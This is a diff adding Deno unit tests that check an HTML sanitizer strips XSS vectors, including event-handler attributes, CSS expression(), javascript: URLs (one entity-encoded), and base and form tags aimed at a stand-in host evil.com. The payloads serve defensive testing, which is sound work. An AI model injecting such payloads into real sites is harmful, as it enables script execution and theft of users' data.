@@ -173,3 +173,58 @@ Deno.test("XSS: img srcのvbscript:プロトコルをブロック", async () => 
   const result = await sanitizeHTML(malicious);
   assertEquals(result.includes("vbscript:"), false);
 });
+
+/**
+ * 追加XSSベクター（最新の攻撃パターン）
+ */
+
+Deno.test("XSS: onmouseover属性をブロック", async () => {
+  const malicious = "<div onmouseover=\"alert('XSS')\">Hover me</div>";
+  const result = await sanitizeHTML(malicious);
+  assertEquals(result.includes("onmouseover"), false);
+});
+
+Deno.test("XSS: onfocus属性をブロック", async () => {
+  const malicious = "<input onfocus=\"alert('XSS')\" autofocus>";
+  const result = await sanitizeHTML(malicious);
+  assertEquals(result.includes("onfocus"), false);
+});
+
+Deno.test("XSS: style属性のexpression()をブロック", async () => {
+  const malicious =
+    "<div style=\"background:expression(alert('XSS'))\">Test</div>";
+  const result = await sanitizeHTML(malicious);
+  assertEquals(result.includes("expression"), false);
+});
+
+Deno.test("XSS: SVG onload属性をブロック", async () => {
+  const malicious = '<svg onload="alert(\'XSS\')"><circle r="10"/></svg>';
+  const result = await sanitizeHTML(malicious);
+  assertEquals(result.includes("onload"), false);
+});
+
+Deno.test("XSS: iframe要素をブロック", async () => {
+  const malicious = "<iframe src=\"javascript:alert('XSS')\"></iframe>";
+  const result = await sanitizeHTML(malicious);
+  assertEquals(result.includes("<iframe"), false);
+});
+
+Deno.test("XSS: base要素をブロック", async () => {
+  const malicious = '<base href="https://evil.com/">';
+  const result = await sanitizeHTML(malicious);
+  assertEquals(result.includes("<base"), false);
+});
+
+Deno.test("XSS: form要素をブロック", async () => {
+  const malicious =
+    '<form action="https://evil.com/steal"><input type="submit"></form>';
+  const result = await sanitizeHTML(malicious);
+  assertEquals(result.includes("<form"), false);
+});
+
+Deno.test("XSS: エンコード済みjavascript:をブロック", async () => {
+  const malicious =
+    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Click</a>';
+  const result = await sanitizeHTML(malicious);
+  assertEquals(result.includes("javascript:"), false);
+});
